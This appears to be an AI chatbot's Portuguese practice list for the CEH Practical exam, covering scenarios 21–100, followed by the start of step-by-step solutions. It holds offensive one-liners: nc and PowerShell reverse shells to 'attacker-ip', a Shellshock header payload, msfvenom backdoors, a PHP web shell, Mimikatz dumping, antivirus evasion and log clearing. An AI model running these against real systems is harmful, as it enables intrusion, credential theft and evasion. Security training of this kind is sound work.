+2️⃣1️⃣ Exploração do SAM Database no Windows
+
+
+
+Cenário: Você acessou um servidor Windows e quer extrair os hashes de senha.
+
+Tarefa: Utilize hashdump no Metasploit para extrair os hashes.
+
+💡 Dica: No meterpreter, tente hashdump.
+
+
+
+⸻
+
+
+
+🌐 Ataques a Aplicações Web (Continuação)
+
+
+
+2️⃣2️⃣ Testando Uploads de Arquivos
+
+
+
+Cenário: Um sistema permite upload de arquivos, mas pode ter validações fracas.
+
+Tarefa: Faça upload de um shell PHP disfarçado de imagem.
+
+💡 Dica: Teste renomear um shell para shell.php.jpg e veja se ele é executado.
+
+
+
+2️⃣3️⃣ Evasão de WAF (Web Application Firewall)
+
+
+
+Cenário: Você identificou um WAF protegendo um site, bloqueando seus ataques.
+
+Tarefa: Tente contornar o WAF utilizando técnicas de bypass.
+
+💡 Dica: Teste codificação hexadecimal ou URL encoding no ataque.
+
+
+
+2️⃣4️⃣ Ataque a API Exposta
+
+
+
+Cenário: Você descobriu uma API aberta sem autenticação.
+
+Tarefa: Faça chamadas HTTP para endpoints e veja se consegue obter dados sensíveis.
+
+💡 Dica: Ferramentas como Postman e cURL podem ajudar (curl -X GET https://api.target.com/users).
+
+
+
+⸻
+
+
+
+📡 Ataques a Redes e Protocolos (Continuação)
+
+
+
+2️⃣5️⃣ Spoofing de DNS para Redirecionamento
+
+
+
+Cenário: Você quer redirecionar usuários de um site legítimo para um falso.
+
+Tarefa: Utilize dnsspoof para alterar as respostas DNS da vítima.
+
+💡 Dica: Teste dnsspoof -i eth0 host target.com.
+
+
+
+2️⃣6️⃣ Ataque de ARP Spoofing
+
+
+
+Cenário: Você deseja interceptar tráfego entre duas máquinas na LAN.
+
+Tarefa: Utilize Bettercap ou Ettercap para envenenar a tabela ARP da vítima.
+
+💡 Dica: Teste bettercap -iface eth0 -eval "arp.spoof on".
+
+
+
+2️⃣7️⃣ Interceptação de Credenciais via MITM
+
+
+
+Cenário: Você suspeita que credenciais estão sendo enviadas sem criptografia na rede.
+
+Tarefa: Utilize Wireshark para capturar pacotes e filtrar logins HTTP.
+
+💡 Dica: Use o filtro http.request.method == "POST".
+
+
+
+⸻
+
+
+
+🔬 Forense Digital e Resposta a Incidentes (Continuação)
+
+
+
+2️⃣8️⃣ Análise de Tráfego Malicioso
+
+
+
+Cenário: Você recebeu um arquivo .pcap suspeito.
+
+Tarefa: Utilize Wireshark para identificar se há indícios de exfiltração de dados.
+
+💡 Dica: Procure grandes quantidades de pacotes enviados para um IP desconhecido.
+
+
+
+2️⃣9️⃣ Recuperação de Arquivos Deletados no Windows
+
+
+
+Cenário: Um usuário deletou arquivos importantes do seu PC.
+
+Tarefa: Utilize Autopsy ou Recuva para tentar recuperá-los.
+
+💡 Dica: No Autopsy, verifique a aba Deleted Files.
+
+
+
+3️⃣0️⃣ Identificação de Rootkits
+
+
+
+Cenário: Um sistema Linux está se comportando de forma estranha.
+
+Tarefa: Utilize chkrootkit para verificar se há rootkits instalados.
+
+💡 Dica: Teste chkrootkit | grep INFECTED.
+
+
+
+⸻
+
+
+
+🔥 Teste de Firewalls e IDS
+
+
+
+3️⃣1️⃣ Identificação de Regras de Firewall
+
+
+
+Cenário: Você está testando um servidor protegido por firewall.
+
+Tarefa: Utilize Nmap para identificar quais portas estão filtradas.
+
+💡 Dica: Teste nmap -Pn -p- 192.168.1.10.
+
+
+
+3️⃣2️⃣ Evasão de IDS com Pacotes Fragmentados
+
+
+
+Cenário: Um IDS está detectando seus ataques.
+
+Tarefa: Utilize fragmentação de pacotes para tentar contornar a detecção.
+
+💡 Dica: Teste nmap -f 192.168.1.10.
+
+
+
+3️⃣3️⃣ Túnel DNS para Exfiltração de Dados
+
+
+
+Cenário: Você quer transferir arquivos de um sistema restrito.
+
+Tarefa: Utilize dns2tcp para criar um túnel de saída via DNS.
+
+💡 Dica: Experimente configurar um servidor DNS e testar dns2tcp -r.
+
+
+
+⸻
+
+
+
+🚀 Extras
+
+
+
+3️⃣4️⃣ Automação de Ataques com Scripts
+
+
+
+Cenário: Você deseja automatizar uma varredura e exploração de rede.
+
+Tarefa: Crie um script Bash que rode um Nmap, colete IPs e tente ataques básicos.
+
+💡 Dica: Utilize um loop for ip in $(cat lista_ips.txt); do nmap -sV $ip; done.
+
+
+
+3️⃣5️⃣ Identificação de Dispositivos IoT Vulneráveis
+
+
+
+Cenário: Você quer testar a segurança de dispositivos inteligentes na rede.
+
+Tarefa: Utilize Shodan para encontrar dispositivos IoT desprotegidos.
+
+💡 Dica: Teste shodan search "webcam".
+
+
+
+3️⃣6️⃣ Análise de Malware
+
+
+
+Cenário: Um arquivo suspeito foi baixado de um e-mail.
+
+Tarefa: Utilize Cuckoo Sandbox ou VirusTotal para analisá-lo.
+
+💡 Dica: No Cuckoo, suba o arquivo e veja os comportamentos.
+
+
+
+3️⃣7️⃣ Criação de Wordlists Personalizadas
+
+
+
+Cenário: Você quer gerar uma wordlist personalizada para um ataque de força bruta.
+
+Tarefa: Utilize Cewl para gerar uma lista baseada em um site específico.
+
+💡 Dica: Teste cewl -w lista.txt target.com.
+
+
+
+⸻
+
+
+
+📢 Quer continuar?
+
+
+
+Isso já cobre 37 cenários, mas posso expandir até 100! Você quer que eu continue nesse formato ou tem alguma área específica que deseja reforçar? 🚀🔥
+
+
+
+
+
+Ótimo! Aqui está a continuação com mais cenários detalhados para a sua preparação no CEH Practical. Vamos continuar até 100 questões!
+
+
+
+⸻
+
+
+
+🛠️ Exploits e Exploração de Vulnerabilidades
+
+
+
+3️⃣8️⃣ Exploração de Diretórios Abertos
+
+
+
+Cenário: Um servidor web pode estar expondo arquivos sensíveis.
+
+Tarefa: Utilize Gobuster para identificar diretórios ocultos em http://target.com.
+
+💡 Dica: Teste gobuster dir -u http://target.com -w common.txt.
+
+
+
+3️⃣9️⃣ Exploitação de uma Versão Vulnerável do Apache
+
+
+
+Cenário: Um servidor Apache 2.4.49 foi identificado na rede.
+
+Tarefa: Utilize Metasploit para verificar se há exploits disponíveis.
+
+💡 Dica: No Metasploit, tente search apache 2.4.49.
+
+
+
+4️⃣0️⃣ Comprometimento via EternalBlue
+
+
+
+Cenário: Você encontrou um servidor Windows 7 rodando SMBv1.
+
+Tarefa: Utilize o exploit EternalBlue para obter acesso remoto.
+
+💡 Dica: Teste use exploit/windows/smb/ms17_010_eternalblue no Metasploit.
+
+
+
+4️⃣1️⃣ Exploração de um CMS WordPress
+
+
+
+Cenário: O site alvo utiliza WordPress e pode ter plugins vulneráveis.
+
+Tarefa: Utilize WPScan para verificar vulnerabilidades conhecidas.
+
+💡 Dica: Teste wpscan --url http://target.com --enumerate vp.
+
+
+
+⸻
+
+
+
+🏴‍☠️ Engenharia Social e Phishing
+
+
+
+4️⃣2️⃣ Criação de Página de Phishing
+
+
+
+Cenário: Você quer testar a segurança dos funcionários contra ataques de phishing.
+
+Tarefa: Utilize Social-Engineer Toolkit (SET) para clonar uma página de login.
+
+💡 Dica: No SET, tente “Website Attack Vectors” > “Credential Harvester Attack”.
+
+
+
+4️⃣3️⃣ Ataque de Phishing com Documento Malicioso
+
+
+
+Cenário: Você deseja enviar um documento malicioso por e-mail para obter acesso remoto.
+
+Tarefa: Utilize MSFVenom para criar um payload em um documento Word.
+
+💡 Dica: Teste msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f rtf > doc.rtf.
+
+
+
+4️⃣4️⃣ Coleta de Credenciais Salvas no Windows
+
+
+
+Cenário: Você obteve acesso a um sistema e quer extrair credenciais salvas.
+
+Tarefa: Utilize LaZagne para buscar senhas armazenadas no Windows.
+
+💡 Dica: Teste lazagne.exe all.
+
+
+
+⸻
+
+
+
+💻 Ataques a Sistemas Operacionais
+
+
+
+4️⃣5️⃣ Bypass de UAC no Windows
+
+
+
+Cenário: Você quer obter privilégios de administrador sem disparar alertas.
+
+Tarefa: Utilize BypassUAC no Metasploit.
+
+💡 Dica: No meterpreter, teste use exploit/windows/local/bypassuac.
+
+
+
+4️⃣6️⃣ Escalonamento de Privilégios com Kernel Exploit no Linux
+
+
+
+Cenário: Você tem acesso como usuário normal e quer obter root.
+
+Tarefa: Utilize LinPEAS para detectar vulnerabilidades.
+
+💡 Dica: Teste wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh.
+
+
+
+4️⃣7️⃣ Dumping de Credenciais no Windows
+
+
+
+Cenário: Você comprometeu um servidor Windows e quer obter credenciais de usuários.
+
+Tarefa: Utilize Mimikatz para extrair credenciais.
+
+💡 Dica: Teste mimikatz.exe privilege::debug sekurlsa::logonpasswords.
+
+
+
+⸻
+
+
+
+🎯 Pentest em Aplicações e Serviços
+
+
+
+4️⃣8️⃣ Varredura de Banco de Dados Exposto
+
+
+
+Cenário: Um banco MySQL pode estar acessível sem senha.
+
+Tarefa: Utilize Nmap para verificar se o serviço está vulnerável.
+
+💡 Dica: Teste nmap --script mysql-empty-password -p 3306 target.com.
+
+
+
+4️⃣9️⃣ Ataque a um Servidor FTP Vulnerável
+
+
+
+Cenário: Você identificou um servidor vsFTPd 2.3.4 na rede.
+
+Tarefa: Utilize um exploit conhecido para obter acesso ao sistema.
+
+💡 Dica: No Metasploit, teste use exploit/unix/ftp/vsftpd_234_backdoor.
+
+
+
+5️⃣0️⃣ Comprometimento de uma Aplicação com RCE
+
+
+
+Cenário: Um site permite execução de comandos no servidor.
+
+Tarefa: Utilize burp suite para modificar requisições HTTP e injetar um comando malicioso.
+
+💡 Dica: Teste & whoami em um parâmetro de entrada.
+
+
+
+⸻
+
+
+
+🌐 Ataques a Protocolos de Comunicação
+
+
+
+5️⃣1️⃣ Interceptação de Comunicações via Telnet
+
+
+
+Cenário: Um servidor Telnet está rodando sem criptografia.
+
+Tarefa: Utilize tcpdump para capturar credenciais de login.
+
+💡 Dica: Teste tcpdump -i eth0 port 23 -X.
+
+
+
+5️⃣2️⃣ Desvio de Restrição de Firewall com ICMP
+
+
+
+Cenário: Você quer manter comunicação sem ser detectado por firewalls.
+
+Tarefa: Utilize ping tunneling para burlar restrições de rede.
+
+💡 Dica: Teste ping -p "shellcode" target.com.
+
+
+
+5️⃣3️⃣ Escaneamento Passivo de Rede Wi-Fi
+
+
+
+Cenário: Você quer mapear redes sem fio sem ser detectado.
+
+Tarefa: Utilize Kismet para escanear SSIDs próximos.
+
+💡 Dica: Teste kismet -c wlan0.
+
+
+
+⸻
+
+
+
+🔄 Manutenção de Acesso e Exfiltração de Dados
+
+
+
+5️⃣4️⃣ Criação de um Web Shell Persistente
+
+
+
+Cenário: Você obteve acesso a um site e deseja manter um backdoor ativo.
+
+Tarefa: Faça upload de um web shell PHP.
+
+💡 Dica: Teste <?php system($_GET['cmd']); ?>.
+
+
+
+5️⃣5️⃣ Evasão de Antivírus com Codificação XOR
+
+
+
+Cenário: Você quer ofuscar um payload para evitar detecção.
+
+Tarefa: Utilize Veil-Evasion para gerar um executável indetectável.
+
+💡 Dica: Teste python veil.py.
+
+
+
+5️⃣6️⃣ Extração de Dados via DNS
+
+
+
+Cenário: Você deseja enviar dados para fora sem disparar alarmes.
+
+Tarefa: Utilize DNS exfiltration para ocultar tráfego malicioso.
+
+💡 Dica: Teste dnscat2 --dns domain.com.
+
+
+
+⸻
+
+
+
+🚀 Você quer que eu continue?
+
+
+
+Isso cobre 56 cenários, mas posso expandir até 100! Você quer mais questões sobre alguma área específica ou deseja que eu continue cobrindo de forma geral? 🔥🔥🔥
+
+
+
+Ótimo! Vamos continuar até 100 questões detalhadas para sua preparação no CEH Practical.
+
+
+
+⸻
+
+
+
+🎯 Pentest em Redes e Infraestrutura
+
+
+
+5️⃣7️⃣ Ataque a um Servidor SNMP Vulnerável
+
+
+
+Cenário: Você identificou um serviço SNMP acessível sem autenticação.
+
+Tarefa: Utilize snmpwalk para coletar informações do sistema.
+
+💡 Dica: Teste snmpwalk -v2c -c public 192.168.1.10.
+
+
+
+5️⃣8️⃣ Ataque de Força Bruta a um Servidor SSH
+
+
+
+Cenário: Um servidor SSH permite autenticação por senha.
+
+Tarefa: Utilize Hydra para testar um ataque de força bruta.
+
+💡 Dica: Teste hydra -l root -P rockyou.txt ssh://192.168.1.10.
+
+
+
+5️⃣9️⃣ Exfiltração de Dados via HTTP
+
+
+
+Cenário: Você deseja transferir arquivos sem levantar suspeitas.
+
+Tarefa: Utilize um simples curl para enviar um arquivo via HTTP POST.
+
+💡 Dica: Teste curl -X POST -F "file=@dados.zip" http://target.com/upload.php.
+
+
+
+6️⃣0️⃣ Exploração de uma Máquina Windows via RDP
+
+
+
+Cenário: Um servidor Windows permite acesso remoto via RDP.
+
+Tarefa: Utilize xFreeRDP para tentar se conectar.
+
+💡 Dica: Teste xfreerdp /v:192.168.1.10 /u:admin /p:password123.
+
+
+
+⸻
+
+
+
+🔥 Ataques a Bancos de Dados
+
+
+
+6️⃣1️⃣ Ataque de SQL Injection em Login
+
+
+
+Cenário: Um site permite login com usuário e senha.
+
+Tarefa: Teste um ataque de SQL Injection na entrada do formulário.
+
+💡 Dica: Use ' OR 1=1 -- como senha.
+
+
+
+6️⃣2️⃣ Extração de Tabelas do Banco de Dados
+
+
+
+Cenário: Você confirmou que o sistema é vulnerável a SQL Injection.
+
+Tarefa: Utilize sqlmap para listar tabelas do banco.
+
+💡 Dica: Teste sqlmap -u "http://target.com/login.php?user=admin" --dbs.
+
+
+
+6️⃣3️⃣ Alteração de Registros via SQL Injection
+
+
+
+Cenário: Você deseja modificar um valor diretamente no banco.
+
+Tarefa: Utilize SQL Injection para atualizar dados de um usuário.
+
+💡 Dica: Tente UPDATE users SET password='hacked' WHERE username='admin'.
+
+
+
+⸻
+
+
+
+📡 Ataques em Redes Wi-Fi
+
+
+
+6️⃣4️⃣ Captura de Handshake WPA2
+
+
+
+Cenário: Você quer capturar pacotes para tentar quebrar a senha de uma rede Wi-Fi.
+
+Tarefa: Utilize airmon-ng e airodump-ng para capturar handshakes.
+
+💡 Dica: Teste airodump-ng wlan0mon --bssid XX:XX:XX:XX:XX:XX -w captura.
+
+
+
+6️⃣5️⃣ Quebra de Senha WPA2 com Ataque de Dicionário
+
+
+
+Cenário: Você já capturou um handshake WPA2.
+
+Tarefa: Utilize aircrack-ng para tentar quebrar a senha com um wordlist.
+
+💡 Dica: Teste aircrack-ng -w rockyou.txt -b XX:XX:XX:XX:XX:XX captura.cap.
+
+
+
+6️⃣6️⃣ Criação de um Rogue AP (Ponto de Acesso Falso)
+
+
+
+Cenário: Você quer enganar usuários para se conectarem ao seu ponto de acesso.
+
+Tarefa: Utilize hostapd para criar um ponto de acesso falso.
+
+💡 Dica: Teste hostapd rogue_ap.conf.
+
+
+
+⸻
+
+
+
+🚀 Ataques Avançados e Evasão
+
+
+
+6️⃣7️⃣ Bypass de Firewalls com Shell Reverso
+
+
+
+Cenário: Você quer obter uma conexão reversa sem ser detectado.
+
+Tarefa: Utilize um shell reverso via Ncat.
+
+💡 Dica: Teste nc -e /bin/bash attacker-ip 4444.
+
+
+
+6️⃣8️⃣ Criação de Binários Maliciosos para Windows
+
+
+
+Cenário: Você precisa criar um executável que evite detecção.
+
+Tarefa: Utilize MSFVenom para gerar um .exe ofuscado.
+
+💡 Dica: Teste msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > backdoor.exe.
+
+
+
+6️⃣9️⃣ Evasão de Assinaturas com Packing
+
+
+
+Cenário: Seu payload está sendo detectado pelo antivírus.
+
+Tarefa: Utilize UPX para empacotar e dificultar a detecção.
+
+💡 Dica: Teste upx --best --ultra-brute backdoor.exe.
+
+
+
+⸻
+
+
+
+🛡️ Defesa e Mitigação de Ataques
+
+
+
+7️⃣0️⃣ Configuração Segura de SSH
+
+
+
+Cenário: Você deseja endurecer a configuração de um servidor SSH.
+
+Tarefa: Edite o sshd_config para desativar root login e autenticação por senha.
+
+💡 Dica: PermitRootLogin no, PasswordAuthentication no.
+
+
+
+7️⃣1️⃣ Monitoramento de Atividade Suspeita com Sysmon
+
+
+
+Cenário: Você quer detectar ataques em um sistema Windows.
+
+Tarefa: Utilize Sysmon para monitorar processos e conexões.
+
+💡 Dica: Instale com sysmon -accepteula -i config.xml.
+
+
+
+7️⃣2️⃣ Configuração de Regras no Snort para Detectar Ataques
+
+
+
+Cenário: Você deseja configurar um IDS para detectar port scans.
+
+Tarefa: Crie uma regra no Snort para capturar tráfego suspeito.
+
+💡 Dica: Teste alert tcp any any -> any any (msg:"Possible Port Scan"; flags:S; threshold:type threshold, track by_src, count 5, seconds 10;).
+
+
+
+⸻
+
+
+
+🚀 Pentest Completo: CTF e Escalada de Acesso
+
+
+
+7️⃣3️⃣ CTF: Exploração de LFI (Local File Inclusion)
+
+
+
+Cenário: Você encontrou uma aplicação vulnerável a LFI.
+
+Tarefa: Utilize um exploit LFI para ler o arquivo /etc/passwd.
+
+💡 Dica: Teste http://target.com/index.php?page=../../../../etc/passwd.
+
+
+
+7️⃣4️⃣ CTF: Escalonamento de Privilégios no Linux
+
+
+
+Cenário: Você acessou um sistema Linux como usuário comum.
+
+Tarefa: Utilize SUID binaries para obter root.
+
+💡 Dica: Teste find / -perm -u=s -type f 2>/dev/null.
+
+
+
+7️⃣5️⃣ CTF: Persistência em um Servidor Linux
+
+
+
+Cenário: Você obteve acesso root e deseja manter persistência.
+
+Tarefa: Crie uma backdoor via SSH para garantir acesso futuro.
+
+💡 Dica: Adicione sua chave pública em ~/.ssh/authorized_keys.
+
+
+
+⸻
+
+
+
+🔥 Isso já cobre 75 questões! Você quer que eu continue até 100 ou tem alguma área que deseja focar mais? 🚀
+
+
+
+Ótimo! Vamos seguir até 100 questões para garantir que você esteja bem preparado para o CEH Practical.
+
+
+
+⸻
+
+
+
+🔥 Pentest em Sistemas Web e API
+
+
+
+7️⃣6️⃣ CTF: Exploração de Open Redirect
+
+
+
+Cenário: Você identificou um parâmetro vulnerável a Open Redirect.
+
+Tarefa: Exploite a falha para redirecionar usuários para um site malicioso.
+
+💡 Dica: Teste http://target.com/login?redirect=http://evil.com.
+
+
+
+7️⃣7️⃣ CTF: Bypass de Autenticação via HTTP Parameter Pollution
+
+
+
+Cenário: Um sistema pode estar manipulando parâmetros de requisição errados.
+
+Tarefa: Utilize Burp Suite para testar a injeção de parâmetros duplicados.
+
+💡 Dica: Teste http://target.com/login?user=admin&user=guest.
+
+
+
+7️⃣8️⃣ CTF: Exploração de Diretórios não Indexados
+
+
+
+Cenário: O servidor pode estar expondo arquivos sensíveis.
+
+Tarefa: Utilize dirb para verificar diretórios ocultos.
+
+💡 Dica: Teste dirb http://target.com /usr/share/wordlists/common.txt.
+
+
+
+7️⃣9️⃣ CTF: Injeção de Comandos em Headers HTTP
+
+
+
+Cenário: O servidor aceita inputs nos headers HTTP.
+
+Tarefa: Utilize Burp Suite para testar injeção de comandos em User-Agent.
+
+💡 Dica: Teste User-Agent: () { :; }; /bin/bash -c 'nc -e /bin/bash attacker-ip 4444'.
+
+
+
+⸻
+
+
+
+🏴‍☠️ Ataques a Serviços de Rede
+
+
+
+8️⃣0️⃣ Ataque a um Serviço SMB Vulnerável
+
+
+
+Cenário: Você identificou um serviço SMB acessível na rede.
+
+Tarefa: Utilize enum4linux para coletar informações.
+
+💡 Dica: Teste enum4linux -a 192.168.1.10.
+
+
+
+8️⃣1️⃣ Ataque MITM com ARP Spoofing
+
+
+
+Cenário: Você quer interceptar tráfego entre dois hosts.
+
+Tarefa: Utilize ettercap para realizar um ataque MITM.
+
+💡 Dica: Teste ettercap -Tq -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.100/.
+
+
+
+8️⃣2️⃣ Desvio de Filtragem com ICMP Tunneling
+
+
+
+Cenário: Você quer exfiltrar dados sem ser detectado.
+
+Tarefa: Utilize icmptunnel para enviar dados via ICMP.
+
+💡 Dica: Teste icmptunnel -s attacker-ip -c victim-ip.
+
+
+
+⸻
+
+
+
+🚀 Engenharia Reversa e Exploração de Binários
+
+
+
+8️⃣3️⃣ Descompilação de um Executável para Encontrar Senhas
+
+
+
+Cenário: Você recebeu um executável e quer extrair credenciais.
+
+Tarefa: Utilize strings para procurar por senhas embutidas.
+
+💡 Dica: Teste strings programa.exe | grep "password".
+
+
+
+8️⃣4️⃣ Exploração de Buffer Overflow em um Binário Vulnerável
+
+
+
+Cenário: Você encontrou um programa que não valida inputs corretamente.
+
+Tarefa: Utilize gdb para identificar um overflow.
+
+💡 Dica: Teste python -c 'print("A"*200)' | ./programa.
+
+
+
+⸻
+
+
+
+🕵️‍♂️ Coleta de Informações e Footprinting
+
+
+
+8️⃣5️⃣ Coleta de Subdomínios de um Alvo
+
+
+
+Cenário: Você quer mapear subdomínios de um site.
+
+Tarefa: Utilize Sublist3r para listar subdomínios.
+
+💡 Dica: Teste sublist3r -d target.com.
+
+
+
+8️⃣6️⃣ Coleta de Tecnologias Usadas em um Site
+
+
+
+Cenário: Você quer identificar tecnologias utilizadas por um site.
+
+Tarefa: Utilize WhatWeb para coletar informações.
+
+💡 Dica: Teste whatweb http://target.com.
+
+
+
+⸻
+
+
+
+🔥 Evasão e Persistência
+
+
+
+8️⃣7️⃣ Uso de DNS Tunneling para Evitar Detecção
+
+
+
+Cenário: Você quer comunicar-se sem ser detectado por firewalls.
+
+Tarefa: Utilize dnscat2 para tunelamento.
+
+💡 Dica: Teste dnscat2 --dns attacker.com.
+
+
+
+8️⃣8️⃣ Criação de um Rootkit Simples para Linux
+
+
+
+Cenário: Você quer esconder processos maliciosos.
+
+Tarefa: Utilize um LD_PRELOAD para ocultar processos.
+
+💡 Dica: Teste export LD_PRELOAD=/caminho/do/rootkit.so.
+
+
+
+⸻
+
+
+
+💻 Comprometimento de Sistemas Windows
+
+
+
+8️⃣9️⃣ Escalada de Privilégios no Windows via Token Impersonation
+
+
+
+Cenário: Você quer escalar privilégios em um sistema Windows.
+
+Tarefa: Utilize Incognito no Meterpreter.
+
+💡 Dica: Teste use incognito; list_tokens -u; impersonate_token "Administrator".
+
+
+
+9️⃣0️⃣ Extração de Hashes de Senhas do SAM
+
+
+
+Cenário: Você comprometeu um sistema Windows e quer obter hashes de senha.
+
+Tarefa: Utilize hashdump no Meterpreter.
+
+💡 Dica: Teste hashdump.
+
+
+
+⸻
+
+
+
+🎯 Ataques a IoT e Dispositivos Conectados
+
+
+
+9️⃣1️⃣ Pentest em um Dispositivo IoT com Telnet
+
+
+
+Cenário: Um dispositivo IoT expõe uma interface Telnet sem senha.
+
+Tarefa: Utilize telnet para se conectar.
+
+💡 Dica: Teste telnet 192.168.1.20.
+
+
+
+9️⃣2️⃣ Comprometimento de um Dispositivo IoT via Firmware Backdoor
+
+
+
+Cenário: Um firmware de um roteador contém credenciais padrão.
+
+Tarefa: Utilize binwalk para extrair e analisar o firmware.
+
+💡 Dica: Teste binwalk -e firmware.bin.
+
+
+
+⸻
+
+
+
+🔄 Testes Avançados de Persistência e Backdoors
+
+
+
+9️⃣3️⃣ Criação de um Backdoor Persistente no Windows
+
+
+
+Cenário: Você quer garantir acesso persistente ao sistema.
+
+Tarefa: Utilize schtasks para criar uma tarefa agendada.
+
+💡 Dica: Teste schtasks /create /tn Backdoor /tr C:\backdoor.exe /sc onlogon.
+
+
+
+9️⃣4️⃣ Uso de PowerShell para Criar um Shell Reverso
+
+
+
+Cenário: Você quer obter um shell reverso sem baixar arquivos.
+
+Tarefa: Utilize um comando PowerShell para executar um payload.
+
+💡 Dica: Teste powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);$stream = $client.GetStream();...".
+
+
+
+⸻
+
+
+
+🎯 Desafios Finais e Simulação de Ataques Reais
+
+
+
+9️⃣5️⃣ CTF: Pivoting em uma Rede Interna
+
+
+
+Cenário: Você tem acesso a uma máquina, mas precisa avançar na rede.
+
+Tarefa: Utilize ProxyChains para redirecionar tráfego através dela.
+
+💡 Dica: Teste proxychains nmap -sT -Pn -p- 192.168.2.1/24.
+
+
+
+9️⃣6️⃣ CTF: Evasão de SIEM e Logs
+
+
+
+Cenário: Você quer limpar rastros após um ataque.
+
+Tarefa: Utilize Wevtutil para limpar logs do Windows.
+
+💡 Dica: Teste wevtutil cl Security.
+
+
+
+⸻
+
+
+
+🔥🔥🔥 Você já tem 96 questões! Quer que eu finalize com mais 4 desafios avançados? 🚀
+
+
+
+Ótimo! Vamos finalizar com os últimos 4 desafios avançados para fechar as 100 questões e te deixar pronto para o CEH Practical! 🚀
+
+
+
+⸻
+
+
+
+🎯 Desafios Avançados: Simulação de Ataques e Defesa
+
+
+
+9️⃣7️⃣ CTF: Bypass de Autenticação em um Sistema com JWT
+
+
+
+Cenário: Um sistema usa JSON Web Tokens (JWT) para autenticação. Você suspeita que a chave de assinatura é fraca.
+
+Tarefa: Utilize jwt_tool para tentar quebrar a chave secreta e gerar um token falso.
+
+💡 Dica: Teste jwt_tool token.jwt -C -d rockyou.txt.
+
+
+
+⸻
+
+
+
+9️⃣8️⃣ CTF: Extração de Credenciais de um Banco de Dados MongoDB
+
+
+
+Cenário: Você identificou um banco MongoDB exposto sem autenticação.
+
+Tarefa: Utilize o mongo shell para listar as bases de dados e extrair credenciais.
+
+💡 Dica: Teste:
+
+
+
+mongo 192.168.1.10:27017  
+
+show dbs  
+
+use admin  
+
+db.users.find()
+
+
+
+
+
+
+
+⸻
+
+
+
+9️⃣9️⃣ CTF: Exploração de uma Aplicação Web com SSRF (Server-Side Request Forgery)
+
+
+
+Cenário: Você encontrou um formulário de upload de URL que pode ser vulnerável a SSRF.
+
+Tarefa: Utilize SSRF para acessar metadados de uma instância da AWS.
+
+💡 Dica: Teste enviando:
+
+
+
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+
+
+
+
+
+
+⸻
+
+
+
+1️⃣0️⃣0️⃣ CTF: Uso de Certificados SSL Falsificados para Interceptar Tráfego HTTPS
+
+
+
+Cenário: Você deseja interceptar tráfego HTTPS de um alvo sem gerar alertas de certificado inválido.
+
+Tarefa: Utilize mitmproxy ou Burp Suite com um certificado falso.
+
+💡 Dica: Gere um certificado falso com:
+
+
+
+openssl req -x509 -newkey rsa:2048 -keyout fake-cert.pem -out fake-cert.pem -days 365 -nodes
+
+
+
+
+
+
+
+⸻
+
+
+
+🔥🔥🔥 Pronto! Agora você tem 100 questões práticas para treinar e garantir que esteja afiado para o CEH Practical!
+
+
+
+📌 Dicas Finais:
+
+✅ Treine comandos no Kali Linux antes da prova.
+
+✅ Use máquinas virtuais para simular ataques reais.
+
+✅ Crie um ambiente de testes seguro para praticar exploits sem comprometer sistemas reais.
+
+✅ Foque em habilidades práticas e no uso eficiente das ferramentas de pentest.
+
+
+
+💬 Se precisar de mais alguma coisa, é só falar! Boa sorte na prova, você vai arrasar! 🚀💀
+
+
+
+Ótimo! Vou fornecer passo a passo detalhado para resolver cada questão da sua lista. Vou dividir em seções para que fique fácil seguir.
+
+
+
+⸻
+
+
+
+Questão 1: Encontrar o IP do Servidor WAMP
+
+
+
+Objetivo: Identificar o IP de uma máquina rodando um WAMP Server na rede.
+
+
+
+Passos:
+
+	1.	Verificar seu IP e rede:
+
+	•	Execute:
+
+
+
+ip a  # Linux
+
+ipconfig  # Windows
+
+
+	•	Veja qual é o intervalo da rede (exemplo: 192.168.1.0/24).
+
+
+
+	2.	Escanear a rede para encontrar a máquina WAMP:
+
+	•	Use Nmap para um escaneamento agressivo:
+
+
+
+nmap -A 192.168.1.0/24
+
+
+
+
+
+	•	Alternativamente, focando apenas em portas web comuns:
+
+
+
+nmap -sV -p 80,443,8080 192.168.1.0/24
+
+
+
+
+
+	•	A máquina com Apache, MySQL e PHP será seu alvo (exemplo: 192.168.1.100).
+
+
+
+⸻
+
+
+
+Questão 2: Encontrar o FQDN do Controlador de Domínio
+
+
+
+Objetivo: Identificar o Fully Qualified Domain Name (FQDN) do DC na rede.
+
+
+
+Passos:
+
+	1.	Escaneie a rede para encontrar o controlador de domínio:
+
+
+
+nmap -A --script smb-os-discovery 192.168.1.0/24
+
+
+
+	•	O DC geralmente roda serviços LDAP (porta 389) e Kerberos (porta 88).
+
+
+
+	2.	Obter o nome do domínio usando nslookup:
+
+	•	Suponha que o IP identificado seja 192.168.1.50:
+
+
+
+nslookup 192.168.1.50
+
+
+
+
+
+	•	O resultado mostrará o FQDN (exemplo: dc.company.local).
+
+
+
+⸻
+
+
+
+Questão 3: Identificar SMB, Quebrar Credenciais e Descriptografar Arquivo
+
+
+
+Passos:
+
+	1.	Identificar máquinas com SMB ativo:
+
+
+
+nmap -p 139,445 --script smb-os-discovery 192.168.1.0/24
+
+
+
+	•	O servidor com portas 139 e 445 abertas será seu alvo.
+
+
+
+	2.	Tentar login anônimo:
+
+
+
+smbclient -L \\192.168.1.50
+
+
+
+	•	Se pedir credenciais, pule para o próximo passo.
+
+
+
+	3.	Quebrar senha SMB com Hydra:
+
+
+
+hydra -l usuario -P /usr/share/wordlists/rockyou.txt 192.168.1.50 smb
+
+
+
+	•	Após encontrar a senha, conecte-se ao SMB:
+
+
+
+smbclient //192.168.1.50/share -U usuario
+
+
+
+
+
+	4.	Baixar arquivo criptografado e tentar descriptografá-lo:
+
+	•	Para verificar se o arquivo contém um hash:
+
+
+
+file arquivo
+
+strings arquivo
+
+
+
+
+
+	•	Se for um hash, use John the Ripper para quebrá-lo:
+
+
+
+john --wordlist=/usr/share/wordlists/rockyou.txt arquivo
+
+
+
+
+
+	•	Se for um arquivo zip criptografado, use:
+
+
+
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt arquivo.zip
+
+
+
+
+
+
+
+⸻
+
+
+
+Questão 4: Identificar Android e Obter Arquivos
+
+
+
+Passos:
+
+	1.	Identificar dispositivos Android na rede:
+
+
+
